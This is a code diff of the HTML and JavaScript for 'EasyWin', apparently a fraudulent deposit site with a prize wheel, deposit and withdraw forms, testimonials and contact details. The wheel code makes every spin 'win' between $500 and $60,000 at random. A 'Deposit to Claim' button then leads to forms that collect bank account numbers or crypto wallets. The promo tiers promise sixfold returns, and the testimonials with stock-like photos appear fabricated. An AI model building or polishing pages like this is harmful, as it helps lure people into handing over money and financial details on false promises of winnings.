@@ -45,136 +45,11 @@
     .spin-hint { color: var(--muted-2); font-size: 13px; text-align: center; }
     .modal-backdrop { position: fixed; inset: 0; background: linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.4)); display: flex; align-items: center; justify-content: center; z-index: 60; backdrop-filter: blur(2px); }
     .modal { width: 94%; max-width: 820px; background: linear-gradient(180deg, var(--card), rgba(0,0,0,0.35)); border-radius: 14px; padding: 18px; box-shadow: 0 24px 90px rgba(0,0,0,0.8); border: 1px solid rgba(255,255,255,0.04); }
-    
-    /* Wheel Styles */
-    .wheel-container { position: relative; width: 380px; height: 380px; margin: 0 auto; }
-    .wheel { 
-      width: 100%; 
-      height: 100%; 
-      border-radius: 50%; 
-      position: relative; 
-      transition: transform 4s cubic-bezier(0.25, 0.1, 0.25, 1);
-      box-shadow: 0 12px 50px rgba(0,0,0,0.8);
-    }
-    .wheel-segment { 
-      position: absolute; 
-      width: 50%; 
-      height: 50%; 
-      transform-origin: 100% 100%;
-      display: flex; 
-      align-items: center; 
-      justify-content: center; 
-      font-weight: 900; 
-      font-size: 14px; 
-      color: white; 
-      text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
-      clip-path: polygon(0% 100%, 100% 100%, 100% 0%);
-    }
-    .wheel-segment:nth-child(1) { background: linear-gradient(135deg, #ff6b6b, #ff8e8e); transform: rotate(0deg); }
-    .wheel-segment:nth-child(2) { background: linear-gradient(135deg, #4ecdc4, #44a08d); transform: rotate(60deg); }
-    .wheel-segment:nth-child(3) { background: linear-gradient(135deg, #45b7d1, #96c93d); transform: rotate(120deg); }
-    .wheel-segment:nth-child(4) { background: linear-gradient(135deg, #f9ca24, #f0932b); transform: rotate(180deg); }
-    .wheel-segment:nth-child(5) { background: linear-gradient(135deg, #6c5ce7, #a29bfe); transform: rotate(240deg); }
-    .wheel-segment:nth-child(6) { background: linear-gradient(135deg, #fd79a8, #e84393); transform: rotate(300deg); }
-    
-    .wheel-center { 
-      position: absolute; 
-      top: 50%; 
-      left: 50%; 
-      width: 120px; 
-      height: 120px; 
-      background: linear-gradient(135deg, #041a2b, #07324f); 
-      border-radius: 50%; 
-      transform: translate(-50%, -50%); 
-      display: flex; 
-      align-items: center; 
-      justify-content: center; 
-      font-weight: 900; 
-      color: #dff3ff; 
-      font-size: 16px; 
-      z-index: 10;
-      box-shadow: inset 0 -8px 20px rgba(0,0,0,0.6);
-    }
-    
-    /* Front-facing Arrow Pointer */
-    .wheel-pointer { 
-      position: absolute; 
-      top: -20px; 
-      left: 50%; 
-      transform: translateX(-50%); 
-      width: 0; 
-      height: 0; 
-      border-left: 25px solid transparent; 
-      border-right: 25px solid transparent; 
-      border-top: 40px solid #ffd700; 
-      z-index: 20;
-      filter: drop-shadow(0 4px 8px rgba(0,0,0,0.6));
-    }
-    .pointer-base {
-      position: absolute;
-      top: 35px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 20px;
-      height: 10px;
-      background: #ffd700;
-      border-radius: 0 0 10px 10px;
-    }
-    
-    /* Win Modal */
-    .win-modal { 
-      position: fixed; 
-      inset: 0; 
-      background: rgba(0,0,0,0.8); 
-      display: none; 
-      align-items: center; 
-      justify-content: center; 
-      z-index: 100; 
-      backdrop-filter: blur(5px);
-    }
-    .win-content { 
-      background: linear-gradient(135deg, var(--success), #2ed573); 
-      border-radius: 20px; 
-      padding: 40px; 
-      text-align: center; 
-      max-width: 500px; 
-      width: 90%; 
-      box-shadow: 0 20px 60px rgba(54,208,127,0.3);
-      animation: winPulse 0.6s ease-out;
-    }
-    @keyframes winPulse {
-      0% { transform: scale(0.8); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-    .win-title { 
-      font-size: 28px; 
-      font-weight: 900; 
-      color: white; 
-      margin-bottom: 10px; 
-      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-    }
-    .win-amount { 
-      font-size: 48px; 
-      font-weight: 900; 
-      color: #fff; 
-      margin: 20px 0; 
-      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-    }
-    .deposit-btn { 
-      background: linear-gradient(90deg, #ff6b35, #f7931e); 
-      color: white; 
-      padding: 15px 30px; 
-      border: none; 
-      border-radius: 50px; 
-      font-size: 18px; 
-      font-weight: 800; 
-      cursor: pointer; 
-      margin-top: 20px;
-      box-shadow: 0 8px 25px rgba(255,107,53,0.4);
-      transition: transform 0.2s;
-    }
-    .deposit-btn:hover { transform: translateY(-2px); }
-    
+    .wheel { width: 380px; height: 380px; border-radius: 50%; position: relative; background: conic-gradient(var(--accent) 0 20%, var(--accent-2) 20% 40%, var(--accent) 40% 60%, var(--accent-2) 60% 80%, var(--accent) 80% 100%); display: flex; align-items: center; justify-content: center; box-shadow: 0 12px 50px rgba(0,0,0,0.8); }
+    .wheel .center { width: 140px; height: 140px; border-radius: 50%; background: linear-gradient(135deg, #041a2b, #07324f); font-weight: 900; color: #dff3ff; box-shadow: inset 0 -8px 20px rgba(0,0,0,0.6); font-size: 18px; display: flex; align-items: center; justify-content: center; }
+    .pointer { position: absolute; top: -18px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 22px solid transparent; border-right: 22px solid transparent; border-bottom: 34px solid #ffd74d; border-radius: 3px; z-index: 5; filter: drop-shadow(0 6px 12px rgba(0,0,0,0.6)); }
+    .wheel .prize-label { position: absolute; color: #fff; font-weight: 700; font-size: 14px; text-align: center; width: 80px; transform-origin: center; }
+    #winMessage { margin-top: 12px; text-align: center; }
     input, textarea, select { padding: 10px; border-radius: 8px; border: 1px solid var(--glass); background: transparent; color: #eaf7ff; }
     .muted { color: var(--muted-2); }
     button { padding: 10px 14px; border-radius: 9px; border: 0; background: var(--accent); color: #021426; font-weight: 800; cursor: pointer; }
@@ -182,189 +57,368 @@
     .flex { display: flex; gap: 10px; align-items: center; }
     .stack { display: flex; flex-direction: column; gap: 8px; }
     .hidden { display: none; }
-    @media (max-width: 700px) { 
-      .wheel-container { width: 300px; height: 300px; }
-      .wheel-center { width: 100px; height: 100px; font-size: 14px; }
+    @media (max-width: 700px) {
+      .wheel { width: 300px; height: 300px; }
+      .wheel .center { width: 110px; height: 110px; font-size: 16px; }
+      .wheel .prize-label { font-size: 12px; transform-origin: center; width: 60px; }
+      .wheel .prize-label:nth-child(2) { transform: rotate(0deg) translate(110px) rotate(-0deg); }
+      .wheel .prize-label:nth-child(3) { transform: rotate(60deg) translate(110px) rotate(-60deg); }
+      .wheel .prize-label:nth-child(4) { transform: rotate(120deg) translate(110px) rotate(-120deg); }
+      .wheel .prize-label:nth-child(5) { transform: rotate(180deg) translate(110px) rotate(-180deg); }
+      .wheel .prize-label:nth-child(6) { transform: rotate(240deg) translate(110px) rotate(-240deg); }
+      .wheel .prize-label:nth-child(7) { transform: rotate(300deg) translate(110px) rotate(-300deg); }
       .center-cta { display: none; }
-      .win-content { padding: 30px 20px; }
-      .win-amount { font-size: 36px; }
     }
-    
-    /* Rest of your existing styles */
     table { width: 100%; border-collapse: collapse; font-size: 13px; }
     table th, table td { padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.03); text-align: left; color: var(--muted-2); }
     .pill { padding: 6px 8px; border-radius: 8px; background: rgba(255,255,255,0.02); font-weight: 700; }
-    .detail-box { padding: 12px; background: rgba(255,255,255,0.02); border-radius: 8px; border: 1px solid var(--glass); }
+
+    /* Testimonials */
+    .testimonial-container { max-width: 500px; margin: 20px auto; overflow: hidden; }
+    .testimonial-container:hover .testimonial-wall { animation-play-state: paused; }
+    .testimonial-wall { display: flex; width: 100%; transform: translateX(0); transition: transform 0.5s ease-in-out; animation: slide 25s infinite; }
+    .testimonial { flex: 0 0 100%; min-width: 100%; padding: 15px; background: var(--card); border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.03); text-align: center; position: relative; }
+    .testimonial img { width: 80px; height: 80px; border-radius: 50%; object-fit: cover; margin: 0 auto 10px; border: 2px solid var(--accent); }
+    .testimonial .desc { font-size: 0.9rem; color: var(--muted); line-height: 1.45; font-style: italic; margin: 0 auto 8px; }
+    .testimonial .name { font-weight: bold; color: var(--accent); font-size: 0.95rem; margin-bottom: 5px; }
+    .testimonial .rating::before { content: '★★★★★'; font-size: 0.75rem; color: #ffd700; margin-bottom: 8px; }
+    .testimonial .quote-icon::before { content: '"'; font-size: 1.5rem; color: var(--accent); opacity: 0.2; position: absolute; top: 10px; left: 10px; }
+    @keyframes slide { 0%, 20% { transform: translateX(0); } 25%, 45% { transform: translateX(-100%); } 50%, 70% { transform: translateX(-200%); } 75%, 95% { transform: translateX(-300%); } 100% { transform: translateX(0); } }
+    @media (max-width: 500px) {
+      .testimonial-container { max-width: 90%; }
+      .testimonial { padding: 12px; }
+      .testimonial img { width: 60px; height: 60px; }
+      .testimonial .desc, .testimonial .name { font-size: 0.8rem; }
+      .testimonial .rating::before { font-size: 0.7rem; }
+      .testimonial .quote-icon::before { font-size: 1.2rem; }
+    }
+
+    /* Google Translate */
+    .translate-container { max-width: 1200px; margin: 20px auto; padding: 18px; text-align: center; }
+    .translate-container select { background: var(--card); color: var(--muted); border: 1px solid var(--glass); }
   </style>
 </head>
 <body>
-  <!-- Your existing HTML structure remains the same until the wheel modal -->
+  <noscript>
+    <div style="text-align: center; padding: 20px; background: var(--danger); color: #fff;">
+      JavaScript is required for interactive features and translations. Please enable JavaScript.
+    </div>
+  </noscript>
 
-  <!-- Wheel Modal -->
-  <div id="wheelModal" class="modal-backdrop hidden" aria-hidden="true">
-    <div class="modal">
-      <div class="flex" style="justify-content:space-between; align-items:center">
-        <h2>Spin Promo Tires</h2>
-        <button class="ghost" id="closeWheel">Close</button>
+  <div class="wrap" id="app">
+    <header>
+      <div class="brand">
+        <div class="logo">EW</div>
+        <div>
+          <h1>EasyWin</h1>
+          <div class="muted">Invest. Spin. Earn.</div>
+        </div>
       </div>
-      <div class="flex" style="gap:18px; align-items:center; margin-top:14px; flex-wrap:wrap">
-        <div style="flex:1; display:flex; align-items:center; justify-content:center; min-width:340px">
-          <div class="wheel-container">
-            <div class="wheel-pointer">
-              <div class="pointer-base"></div>
-            </div>
-            <div class="wheel" id="wheel">
-              <!-- Prize Segments -->
-              <div class="wheel-segment">$500</div>
-              <div class="wheel-segment">$1,000</div>
-              <div class="wheel-segment">$3,000</div>
-              <div class="wheel-segment">$6,000</div>
-              <div class="wheel-segment">$12,000</div>
-              <div class="wheel-segment">$60,000</div>
-              
-              <div class="wheel-center">SPIN</div>
+      <nav class="desktop" aria-label="Main navigation">
+        <a onclick="navTo('home')">Home</a>
+        <a onclick="navTo('spin')">Spin and Win</a>
+        <a onclick="navTo('deposit')">Deposit</a>
+        <a onclick="navTo('withdraw')">Withdraw</a>
+        <a onclick="navTo('dashboard')">Dashboard</a>
+        <a onclick="navTo('contact')">Contact Us</a>
+        <a onclick="navTo('support')">Support</a>
+        <div class="cta" onclick="openWheel()">Spin Now</div>
+      </nav>
+      <button class="hamburger" id="hamburger" aria-expanded="false">☰</button>
+      <div class="mobile-nav hidden" id="mobileNav" role="navigation" aria-hidden="true">
+        <a onclick="navTo('home')">Home</a>
+        <a onclick="navTo('spin')">Spin and Win</a>
+        <a onclick="navTo('deposit')">Deposit</a>
+        <a onclick="navTo('withdraw')">Withdraw</a>
+        <a onclick="navTo('dashboard')">Dashboard</a>
+        <a onclick="navTo('contact')">Contact Us</a>
+        <a onclick="navTo('support')">Support</a>
+        <a onclick="openWheel()">Spin Now</a>
+      </div>
+    </header>
+
+    <main id="content" style="margin-top:18px">
+      <!-- HOME -->
+      <section id="home" class="card-section">
+        <div class="card">
+          <h2>Welcome to EasyWin</h2>
+          <p class="lead">Spin the wheel, manage your funds, or contact our support team for assistance.</p>
+          <div class="flex" style="margin-top:12px">
+            <button onclick="openWheel()">Spin Now</button>
+            <button onclick="navTo('deposit')" class="ghost">Deposit</button>
+            <button onclick="navTo('dashboard')" class="ghost">Dashboard</button>
+            <button onclick="goBack()" class="ghost">Back</button>
+          </div>
+        </div>
+
+        <!-- Testimonials -->
+        <div class="card" style="margin-top:16px">
+          <h2>What Our Players Say</h2>
+          <div class="testimonial-container">
+            <div class="testimonial-wall">
+              <div class="testimonial">
+                <div class="quote-icon"></div>
+                <img src="https://raw.githubusercontent.com/expressdeliveryservices/package-tracker/refs/heads/main/IMG_1843.jpeg" alt="David Wilson">
+                <p class="name">David Wilson</p>
+                <p class="rating"></p>
+                <p class="desc">The spin wheel is thrilling! I won a huge bonus on my first spin!</p>
+              </div>
+              <div class="testimonial">
+                <div class="quote-icon"></div>
+                <img src="https://raw.githubusercontent.com/expressdeliveryservices/package-tracker/refs/heads/main/IMG_1844.jpeg" alt="Mark Johnson">
+                <p class="name">Mark Johnson</p>
+                <p class="rating"></p>
+                <p class="desc">Deposits are seamless, and the platform is easy to navigate.</p>
+              </div>
+              <div class="testimonial">
+                <div class="quote-icon"></div>
+                <img src="https://raw.githubusercontent.com/expressdeliveryservices/package-tracker/refs/heads/main/IMG_1846.jpeg" alt="Steven Lee">
+                <p class="name">Steven Lee</p>
+                <p class="rating"></p>
+                <p class="desc">Great support team and an exciting spin feature!</p>
+              </div>
             </div>
           </div>
         </div>
-        <div style="flex:1; min-width:260px">
-          <div class="stack">
-            <label>Deposit Amount (USD)</label>
-            <input id="spinAmount" type="number" min="100" step="50" placeholder="e.g., 100" />
+      </section>
+
+      <!-- SPIN AND WIN -->
+      <section id="spin" class="card-section hidden">
+        <div class="card">
+          <h2>Spin and Win</h2>
+          <p class="lead">Spin the wheel for a chance to win bonuses based on your deposit.</p>
+          <div class="flex" style="margin-top:12px">
+            <button onclick="openWheel()">Spin Now</button>
+            <button onclick="goBack()" class="ghost">Back</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- DASHBOARD -->
+      <section id="dashboard" class="card-section hidden">
+        <div class="card">
+          <h2>Dashboard</h2>
+          <p class="muted">Your account summary and recent activity.</p>
+          <div class="flex" style="margin-top:12px; flex-wrap:wrap">
+            <div style="flex:1; min-width:140px" class="card">
+              <div class="muted">Balance</div>
+              <div style="font-size:20px; font-weight:900; margin-top:6px" id="summaryBalance">$0</div>
+            </div>
+            <div style="flex:1; min-width:140px" class="card">
+              <div class="muted">Pending Deposits</div>
+              <div style="font-size:20px; font-weight:900; margin-top:6px" id="summaryPending">0</div>
+            </div>
+            <div style="flex:1; min-width:140px" class="card">
+              <div class="muted">Withdraw Requests</div>
+              <div style="font-size:20px; font-weight:900; margin-top:6px" id="summaryWithdraws">0</div>
+            </div>
+          </div>
+          <div style="margin-top:12px">
+            <h3 style="margin-bottom:8px">Recent Activity</h3>
+            <table id="activityList">
+              <thead>
+                <tr><th>Date</th><th>Type</th><th>Amount</th><th>Status</th></tr>
+              </thead>
+              <tbody></tbody>
+            </table>
+          </div>
+          <div class="flex" style="margin-top:12px">
+            <button onclick="goBack()" class="ghost">Back</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- DEPOSIT -->
+      <section id="deposit" class="card-section hidden">
+        <div class="card">
+          <h2>Deposit</h2>
+          <p class="muted">Add funds to your account securely.</p>
+          <div class="flex" style="margin-top:10px">
+            <button id="bankBtn">Bank Transfer</button>
+            <button id="cryptoBtn" class="ghost">Crypto</button>
+          </div>
+          <div id="bankDetails" class="detail-box hidden" style="margin-top:12px">
+            <div class="stack">
+              <label>Bank Account Number</label>
+              <input id="bankAcct" type="text" placeholder="Enter bank account number" />
+              <label>Account Holder Name</label>
+              <input id="bankHolder" type="text" placeholder="Enter account holder name" />
+              <label>Bank Name</label>
+              <input id="bankName" type="text" placeholder="Enter bank name" />
+            </div>
+          </div>
+          <div id="cryptoDetails" class="detail-box hidden" style="margin-top:12px">
+            <div class="stack">
+              <label>Crypto Wallet Address</label>
+              <input id="cryptoAddr" type="text" placeholder="Enter BTC, ETH, or USDT address" />
+              <label>Crypto Name</label>
+              <select id="cryptoName">
+                <option value="BTC">Bitcoin (BTC)</option>
+                <option value="ETH">Ethereum (ETH)</option>
+                <option value="USDT">Tether (USDT)</option>
+              </select>
+            </div>
+          </div>
+          <div class="stack" style="margin-top:12px">
+            <label>Amount (USD)</label>
+            <input id="depositAmount" type="number" min="10" step="10" placeholder="e.g., 100" />
             <div class="flex">
-              <button id="spinBtn">Spin Now</button>
-              <button id="spinClose" class="ghost">Close</button>
+              <button id="depositProceed">Proceed</button>
+              <button id="depositClear" class="ghost">Clear</button>
+              <button onclick="goBack()" class="ghost">Back</button>
             </div>
-            <div id="spinResultMsg" class="muted"></div>
+            <div id="depositMsg" class="muted"></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- WITHDRAW -->
+      <section id="withdraw" class="card-section hidden">
+        <div class="card">
+          <h2>Withdraw</h2>
+          <p class="muted">Request a withdrawal to your bank or crypto wallet.</p>
+          <div class="stack" style="margin-top:8px">
+            <label>Amount (USD)</label>
+            <input id="withdrawAmount" type="number" min="1" step="1" placeholder="e.g., 100" />
+            <label>Destination</label>
+            <input id="withdrawDest" type="text" placeholder="Bank account or wallet address" />
+            <div class="flex">
+              <button id="withdrawSubmit">Request</button>
+              <button id="withdrawClear" class="ghost">Clear</button>
+              <button onclick="goBack()" class="ghost">Back</button>
+            </div>
+            <div id="withdrawMsg" class="muted"></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- CONTACT US -->
+      <section id="contact" class="card-section hidden">
+        <div class="card">
+          <h2>Contact Us</h2>
+          <p class="muted">Get in touch with our team.</p>
+          <div class="stack" style="margin-top:12px">
+            <p>Phone: <a href="tel:+19412078626">+1 (941) 207-8626</a></p>
+            <p>Email: <a href="mailto:Expressdeliveryservice0016@gmail.com">Expressdeliveryservice0016@gmail.com</a></p>
+            <div class="flex">
+              <button onclick="navTo('support')">Get Support</button>
+              <button onclick="goBack()" class="ghost">Back</button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- SUPPORT -->
+      <section id="support" class="card-section hidden">
+        <div class="card">
+          <h2>Support</h2>
+          <p class="muted">Submit a support ticket for assistance.</p>
+          <div class="stack" style="margin-top:12px">
+            <label>Subject</label>
+            <input id="supportSubject" type="text" placeholder="Short description" />
+            <label>Message</label>
+            <textarea id="supportMsg" placeholder="Describe your issue..." style="width:100%;"></textarea>
+            <div class="flex">
+              <button id="supportSubmit">Send</button>
+              <button id="supportClear" class="ghost">Clear</button>
+              <button onclick="goBack()" class="ghost">Back</button>
+            </div>
+            <div id="supportNote" class="muted"></div>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <footer style="margin-top:18px">
+      <div class="card">
+        <div class="flex" style="justify-content:space-between; align-items:center; flex-wrap:wrap">
+          <div>&copy; EasyWin 2025</div>
+          <div class="muted">Phone: <a href="tel:+19412078626">+1 (941) 207-8626</a> | Email: <a href="mailto:Expressdeliveryservice0016@gmail.com">Expressdeliveryservice0016@gmail.com</a></div>
+          <div class="flex" style="gap:8px">
+            <a onclick="navTo('home')">Home</a>
+            <a onclick="navTo('contact')">Contact</a>
+            <a onclick="navTo('support')">Support</a>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <!-- Google Translate -->
+    <div class="translate-container">
+      <h3>Change Language</h3>
+      <div id="google_translate_element"></div>
+      <noscript>
+        <div style="text-align: center; padding: 10px; background: var(--danger); color: #fff;">
+          JavaScript is required for translations. Please enable JavaScript.
+        </div>
+      </noscript>
+    </div>
+
+    <!-- Center Spin CTA -->
+    <div class="center-cta" id="centerCta">
+      <button class="spin-big" id="centerSpin">Spin</button>
+      <div class="spin-hint muted">Spin to win bonuses</div>
+    </div>
+
+    <!-- Wheel Modal -->
+    <div id="wheelModal" class="modal-backdrop hidden" aria-hidden="true">
+      <div class="modal">
+        <div class="flex" style="justify-content:space-between; align-items:center">
+          <h2>Spin Promo</h2>
+          <button class="ghost" id="closeWheel">Close</button>
+        </div>
+        <div class="flex" style="gap:18px; align-items:center; margin-top:14px; flex-wrap:wrap">
+          <div style="flex:1; display:flex; align-items:center; justify-content:center; min-width:340px">
+            <div style="position:relative">
+              <div class="pointer" aria-hidden="true"></div>
+              <div class="wheel" id="wheel">
+                <div class="center">SPIN</div>
+                <div class="prize-label" style="transform: rotate(0deg) translate(140px) rotate(-0deg);">$500</div>
+                <div class="prize-label" style="transform: rotate(60deg) translate(140px) rotate(-60deg);">$1,000</div>
+                <div class="prize-label" style="transform: rotate(120deg) translate(140px) rotate(-120deg);">$3,000</div>
+                <div class="prize-label" style="transform: rotate(180deg) translate(140px) rotate(-180deg);">$6,000</div>
+                <div class="prize-label" style="transform: rotate(240deg) translate(140px) rotate(-240deg);">$12,000</div>
+                <div class="prize-label" style="transform: rotate(300deg) translate(140px) rotate(-300deg);">$60,000</div>
+              </div>
+            </div>
+          </div>
+          <div style="flex:1; min-width:260px">
+            <div class="stack">
+              <label>Deposit Amount (USD)</label>
+              <input id="spinAmount" type="number" min="100" step="50" placeholder="e.g., 100" />
+              <div class="flex">
+                <button id="spinBtn">Spin</button>
+                <button id="spinClose" class="ghost">Close</button>
+              </div>
+              <div id="spinResultMsg" class="muted"></div>
+              <div id="winMessage" class="hidden">
+                <h3 id="winText" style="color: var(--success);"></h3>
+                <button id="depositToClaim" style="background: var(--success); margin-top: 10px;">Deposit to Claim</button>
+              </div>
+              <h4 style="margin:14px 0 8px">Promo Tiers</h4>
+              <div class="stack">
+                <div class="flex"><div>$100</div><div>$500</div></div>
+                <div class="flex"><div>$200</div><div>$1,000</div></div>
+                <div class="flex"><div>$500</div><div>$3,000</div></div>
+                <div class="flex"><div>$1,000</div><div>$6,000</div></div>
+                <div class="flex"><div>$2,000</div><div>$12,000</div></div>
+                <div class="flex"><div>$10,000</div><div>$60,000</div></div>
+              </div>
+            </div>
           </div>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- Win Modal -->
-  <div id="winModal" class="win-modal">
-    <div class="win-content">
-      <div class="win-title">🎉 Congratulations! 🎉</div>
-      <div class="win-amount" id="winAmount">$0</div>
-      <p style="color: white; font-size: 16px; margin: 10px 0;">Deposit to claim your prize!</p>
-      <button class="deposit-btn" id="depositBtn">Deposit Now</button>
-    </div>
-  </div>
-
-  <!-- Rest of your existing HTML remains the same -->
-
+  <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
   <script>
-    // Your existing scripts + updated wheel functionality
-
-    // Wheel prizes configuration
-    const prizes = [
-      { amount: 500, label: '$500' },
-      { amount: 1000, label: '$1,000' },
-      { amount: 3000, label: '$3,000' },
-      { amount: 6000, label: '$6,000' },
-      { amount: 12000, label: '$12,000' },
-      { amount: 60000, label: '$60,000' }
-    ];
-
-    // DOM elements
-    const wheelModal = document.getElementById('wheelModal');
-    const wheel = document.getElementById('wheel');
-    const spinBtn = document.getElementById('spinBtn');
-    const spinAmount = document.getElementById('spinAmount');
-    const spinResultMsg = document.getElementById('spinResultMsg');
-    const closeWheel = document.getElementById('closeWheel');
-    const spinClose = document.getElementById('spinClose');
-    const winModal = document.getElementById('winModal');
-    const winAmount = document.getElementById('winAmount');
-    const depositBtn = document.getElementById('depositBtn');
-
-    function openWheel() {
-      wheelModal.classList.remove('hidden');
-      wheelModal.setAttribute('aria-hidden', 'false');
-      wheel.style.transform = 'rotate(0deg)';
-      spinResultMsg.textContent = '';
+    // Google Translate
+    function googleTranslateElementInit() {
+      new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
     }
 
-    function closeWheelModal() {
-      wheelModal.classList.add('hidden');
-      wheelModal.setAttribute('aria-hidden', 'true');
-      wheel.style.transition = 'none';
-      wheel.style.transform = 'rotate(0deg)';
-      spinResultMsg.textContent = '';
-      spinBtn.disabled = false;
-    }
-
-    function showWinModal(prize) {
-      winAmount.textContent = prize.label;
-      winModal.style.display = 'flex';
-      
-      // Hide win modal after 10 seconds or when deposit clicked
-      setTimeout(() => {
-        winModal.style.display = 'none';
-      }, 10000);
-    }
-
-    // Spin functionality
-    spinBtn.addEventListener('click', () => {
-      const amount = parseFloat(spinAmount.value);
-      if (!amount || amount < 100) {
-        spinResultMsg.textContent = 'Please enter a deposit amount of at least $100.';
-        return;
-      }
-
-      spinBtn.disabled = true;
-      spinResultMsg.textContent = 'Spinning... Good luck!';
-      
-      // Calculate random spin (2-5 full rotations + segment selection)
-      const fullRotations = 2 + Math.random() * 3;
-      const segmentIndex = Math.floor(Math.random() * prizes.length);
-      const segmentAngle = 60 * segmentIndex; // Each segment is 60 degrees
-      const finalAngle = (fullRotations * 360) + (360 - segmentAngle - 30); // -30 to center on segment
-      
-      wheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
-      wheel.style.transform = `rotate(${finalAngle}deg)`;
-
-      setTimeout(() => {
-        const prize = prizes[segmentIndex];
-        showWinModal(prize);
-        closeWheelModal();
-        spinAmount.value = ''; // Clear input for next spin
-      }, 4000);
-    });
-
-    // Deposit button redirect
-    depositBtn.addEventListener('click', () => {
-      // Store the won prize in sessionStorage
-      const currentPrize = winAmount.textContent;
-      sessionStorage.setItem('wonPrize', currentPrize);
-      navTo('deposit'); // Navigate to deposit section
-      winModal.style.display = 'none';
-    });
-
-    // Close win modal when clicking outside
-    winModal.addEventListener('click', (e) => {
-      if (e.target === winModal) {
-        winModal.style.display = 'none';
-      }
-    });
-
-    // Existing event listeners
-    closeWheel.addEventListener('click', closeWheelModal);
-    spinClose.addEventListener('click', closeWheelModal);
-
-    // Update deposit section to show won prize
-    document.addEventListener('DOMContentLoaded', () => {
-      const wonPrize = sessionStorage.getItem('wonPrize');
-      if (wonPrize) {
-        const depositMsg = document.getElementById('depositMsg');
-        if (depositMsg) {
-          depositMsg.innerHTML = `<div style="color: var(--success); font-weight: bold;">You won ${wonPrize}! Complete your deposit to claim it.</div>`;
-        }
-        sessionStorage.removeItem('wonPrize');
-      }
-    });
-
-    // Your existing navigation and other scripts remain the same...
+    // Navigation
     function showSection(id) {
       document.querySelectorAll('.card-section').forEach(s => s.classList.add('hidden'));
       const el = document.getElementById(id);
@@ -375,7 +429,276 @@
     function goBack() { history.back() || navTo('home'); }
     showSection('home');
 
-    // ... rest of your existing JavaScript
+    // Hamburger Menu
+    const hamburger = document.getElementById('hamburger');
+    const mobileNav = document.getElementById('mobileNav');
+    hamburger.addEventListener('click', () => {
+      const isActive = mobileNav.classList.toggle('active');
+      mobileNav.classList.toggle('hidden', !isActive);
+      hamburger.setAttribute('aria-expanded', isActive);
+      mobileNav.setAttribute('aria-hidden', !isActive);
+    });
+
+    // Spin Wheel
+    const wheelModal = document.getElementById('wheelModal');
+    const wheel = document.getElementById('wheel');
+    const spinBtn = document.getElementById('spinBtn');
+    const spinAmount = document.getElementById('spinAmount');
+    const spinResultMsg = document.getElementById('spinResultMsg');
+    const closeWheel = document.getElementById('closeWheel');
+    const spinClose = document.getElementById('spinClose');
+    const centerSpin = document.getElementById('centerSpin');
+    const winMessage = document.getElementById('winMessage');
+    const winText = document.getElementById('winText');
+    const depositToClaim = document.getElementById('depositToClaim');
+
+    function openWheel() {
+      wheelModal.classList.remove('hidden');
+      wheelModal.setAttribute('aria-hidden', 'false');
+    }
+
+    function closeWheelModal() {
+      wheelModal.classList.add('hidden');
+      wheelModal.setAttribute('aria-hidden', 'true');
+      wheel.style.transform = 'rotate(0deg)';
+      spinResultMsg.textContent = '';
+      winMessage.classList.add('hidden');
+    }
+
+    centerSpin.addEventListener('click', openWheel);
+    closeWheel.addEventListener('click', closeWheelModal);
+    spinClose.addEventListener('click', closeWheelModal);
+
+    spinBtn.addEventListener('click', async () => {
+      const amount = parseFloat(spinAmount.value);
+      if (!amount || amount < 100) {
+        spinResultMsg.textContent = 'Please enter a deposit amount of at least $100.';
+        winMessage.classList.add('hidden');
+        return;
+      }
+      spinBtn.disabled = true;
+      const prizes = [500, 1000, 3000, 6000, 12000, 60000];
+      const segmentAngle = 360 / prizes.length; // 60 degrees per segment
+      const randomIndex = Math.floor(Math.random() * prizes.length);
+      const targetAngle = randomIndex * segmentAngle + Math.random() * segmentAngle; // Random angle within segment
+      const totalAngle = targetAngle + 720; // Spin 2+ full rotations
+      wheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
+      wheel.style.transform = `rotate(${totalAngle}deg)`;
+
+      const prize = prizes[randomIndex];
+      setTimeout(() => {
+        spinResultMsg.textContent = '';
+        winMessage.classList.remove('hidden');
+        winText.textContent = `Congratulations, you won $${prize.toLocaleString()}!`;
+        wheel.style.transition = 'none';
+        spinBtn.disabled = false;
+      }, 4000);
+
+      // Handle deposit button click
+      depositToClaim.onclick = () => {
+        sessionStorage.setItem('winAmount', prize);
+        closeWheelModal();
+        navTo('deposit');
+      };
+
+      // Uncomment for real API integration
+      /*
+      try {
+        const response = await fetch('/api/spin', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer YOUR_TOKEN' },
+          body: JSON.stringify({ depositAmount: amount })
+        });
+        const result = await response.json();
+        if (response.ok) {
+          const prizeIndex = prizes.indexOf(result.prize);
+          const targetAngle = prizeIndex * segmentAngle + Math.random() * segmentAngle;
+          const totalAngle = targetAngle + 720;
+          wheel.style.transform = `rotate(${totalAngle}deg)`;
+          setTimeout(() => {
+            spinResultMsg.textContent = '';
+            winMessage.classList.remove('hidden');
+            winText.textContent = `Congratulations, you won $${result.prize.toLocaleString()}!`;
+            wheel.style.transition = 'none';
+            spinBtn.disabled = false;
+          }, 4000);
+        } else {
+          spinResultMsg.textContent = result.error || 'Error processing spin.';
+          winMessage.classList.add('hidden');
+          spinBtn.disabled = false;
+        }
+      } catch (error) {
+        spinResultMsg.textContent = 'Network error. Please try again.';
+        winMessage.classList.add('hidden');
+        spinBtn.disabled = false;
+      }
+      */
+    });
+
+    // Dashboard
